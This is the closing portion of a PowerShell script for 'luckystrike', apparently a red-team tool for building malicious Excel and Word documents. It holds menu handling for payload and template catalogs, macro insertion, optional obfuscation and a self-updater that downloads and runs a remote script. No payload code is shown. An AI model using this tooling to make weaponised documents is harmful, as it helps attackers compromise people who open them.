				99		{ exit }
				default { Invalid-Option }
			}
		}
		'payload'	{
			switch ($selection)
			{
				1		{ Select-Payload }
				2		{ Unselect-Payload }
				3		{ List-SelectedPayloads }
				99		{ Load-PreviousMenu }
				default	{ Invalid-Option }
			}
		}
		'catalog'	{
			switch ($selection)
			{
				1		{ Create-DBPayload }
				2		{ Remove-DBPayload }
				3		{ Show-PayloadDetails }
				4		{ Create-DBTemplate }
				5		{ Remove-DBTemplate }
				6		{ Show-TemplateDetails }
				99		{ Load-PreviousMenu }
				default	{ Invalid-Option }
			}
		}
		'file'		{
			switch ($selection)
			{
				1 { 
					switch ($script:doctype){
						1 { # xls
							Create-Excel $linelength -ismodify $false
						}
						2 { # doc
							Create-Word $linelength -ismodify $false
						}
						default {
							Write-message "Bug found. Doctype not understood. Doctype: $($script:doctypeid)" "error"
							exit
						}
					}
				}
				2 { 
					$path = Read-Host -Prompt "Enter path to existing xls or doc (make sure workbook & existing macros are NOT password protected)"
					switch ($script:doctype){
						1 { # xls
							Create-Excel -ismodify $true -existingpath $path 
						}
						2 { # doc
							Create-Word -ismodify $true -existingpath $path 
						}
						default {
							Write-message "Bug found. Doctype not understood. Doctype: $($script:doctypeid)" "error"
							exit
						}
					}
				}
				3		{ 
					switch ($script:doctype){
						1 { # xls
							Create-FileFromTemplate "xls"
						}
						2 { # doc
							Create-FileFromTemplate "doc"
						}
						default {
							Write-message "Bug found. Doctype not understood. Doctype: $($script:doctypeid)" "error"
							exit
						}
					}
				}
				4 		{ Write-MacroText }
				99		{ Load-PreviousMenu }
				default	{ Invalid-Option }
			}
		}
	}
}

function Load-Menu($menuname, $goingback)
{	
	if ($goingback -eq $false)
		{ $script:previousmenus.Add($menuname) }
	
	$script:currentmenu = $menuname
	if ($API -eq $false)
	{
		Write-Message $script:menus[$menuname]
		$selection = Read-Host -Prompt "Select"
		Process-MenuOption $selection
	}
}

#endregion

function UpdatesAvailable()
{
	$updateavailable = $false
	$nextversion = $null
	try
	{
		$nextversion = (New-Object System.Net.WebClient).DownloadString($githubver).Trim([Environment]::NewLine)
	}
	catch [System.Exception] 
	{
		Write-Message $_ "debug"
	}
	
	Write-Message "CURRENT VERSION: $version" "debug"
	Write-Message "NEXT VERSION: $nextversion" "debug"
	if ($nextversion -ne $null -and $version -ne $nextversion)
	{
		#An update is most likely available, but make sure
		$updateavailable = $false
		$curr = $version.Split('.')
		$next = $nextversion.Split('.')
		for($i=0; $i -le ($curr.Count -1); $i++)
		{
			if ([int]$next[$i] -gt [int]$curr[$i])
			{
				$updateavailable = $true
				break
			}
		}
	}
	return $updateavailable
}

function Process-Updates()
{
	if (Test-Connection 8.8.8.8 -Count 1 -Quiet)
	{
		$updatepath = "$($PWD.Path)\update.ps1"
		if (Test-Path -Path $updatepath)	
		{
			#Remove-Item $updatepath
		}
		if (UpdatesAvailable)
		{
			Write-Message "Update available. Do you want to update luckystrike? Your payloads/templates will be preserved." "success"
			$response = Read-Host "`nPlease select Y or N"
			while (($response -match "[YyNn]") -eq $false)
			{
				$response = Read-Host "This is a binary situation. Y or N please."
			}

			if ($response -match "[Yy]")
			{	
				(New-Object System.Net.Webclient).DownloadFile($updatefile, $updatepath)
				Start-Process PowerShell -Arg $updatepath
				exit
			}
		}
	}
	else
	{
		Write-Message "Unable to check for updates. Internet connection not available." "warning"
	}
}

#region Main Script

# Handle Dependencies
foreach ($moduleName in $requiredmodules)
{
    if (!(Get-Module -ListAvailable -Name $moduleName)) 
    {
		switch ($moduleName)
		{
			'Invoke-Obfuscation' {
				Write-Message "Module Invoke-Obfuscation not installed. Obfuscation options will not be available." "warning" -prependNewLine $true
				$can_obfuscate = $false
			}
			default {
				Write-Message "Required module $moduleName missing. Did you run install.ps1?" "error"
				exit
			}
		}
	}
	else
	{
		Import-Module $moduleName
	}
}

if (!(Test-Path $dbpath))
{
	Write-Message "Could not find database at $dbpath. Did you run the install script?" "error"
	exit
}
else 
{
	Init-DB
}

$menus = Get-Menus

Show-Logo
Write-Message "Debug logging enabled" "debug"

if (!([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
{
	Write-Message "Luckystrike will modify HKLM registry keys if necesary and must be run in administrator mode. Please relaunch from an administrative PowerShell window." "error"
	exit	
}

if (!$API)
{
	Process-Updates
}

Load-Menu 'main'

#endregion 	
